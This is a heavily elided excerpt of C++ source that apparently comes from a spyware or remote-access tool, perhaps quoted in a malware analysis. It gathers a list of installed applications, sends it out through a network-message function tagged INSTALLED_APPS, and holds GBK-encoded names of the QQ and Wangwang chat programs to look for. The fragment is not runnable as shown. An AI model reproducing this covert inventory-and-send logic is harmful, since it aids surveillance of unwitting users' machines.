...
int GetApplicationInfo(int bnotfile) {
	int iRet = 0;
	...
	if (bnotfile == FALSE)
	{
		...
		iRet = IndependentNetWork_SendMessage((char*)infojson.c_str(), infojson.length(), INSTALLED_APPS, 0);

#ifdef _DEBUG
		char strFilePath[MAX_PATH] = { 0 };
		iRet = ModifyModuleFileName(strFilePath, INSTALLAPPS_FILENAME);
...
int getInstallList(int cpubits)
{
	...
	unsigned char szQQGBK[]	= {(char)0xcc,(char)0xda,(char)0xd1,(char)0xb6,'Q','Q',0};			//"ÌÚÑ¶QQ"
	...
	unsigned char szWangwangGBK[]	= {(char)0xb0,(char)0xa2,(char)0xc0,(char)0xef,(char)0xcd,(char)0xfa,(char)0xcd,(char)0xfa,0};
